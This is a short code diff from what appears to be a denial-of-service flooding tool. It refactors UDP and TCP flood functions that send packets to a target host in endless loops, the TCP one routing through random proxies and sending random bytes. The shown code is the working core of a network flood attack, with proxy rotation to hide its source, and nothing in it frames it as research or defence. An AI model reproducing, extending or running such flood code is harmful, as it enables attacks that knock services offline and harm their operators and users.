@@ -32,6 +32,7 @@ def down_it_udp(_ctx: Context) -> None:
     i = 1
     error_code = 'Send UDP packet'
     target = (_ctx.host_ip, _ctx.port)
+
     while True:
         sock = _ctx.sock_manager.get_udp_socket()
         request_packet = build_ctx_request_http_package(_ctx)
@@ -95,12 +96,13 @@ def down_it_tcp(_ctx: Context) -> None:
     """TCP flood method."""
     proxy = None
     error_code = 'Send TCP packet'
+    target = (_ctx.host_ip, _ctx.port)
 
     while True:
         try:
             proxy = _ctx.proxy_manager.get_random_proxy()
             sock = _ctx.sock_manager.create_tcp_socket(proxy)
-            sock.connect((_ctx.host_ip, _ctx.port))
+            sock.connect(target)
             _ctx.Statistic.connect.success += 1
             while True:
                 bytes_to_send = randbytes(_ctx.max_random_packet_len)
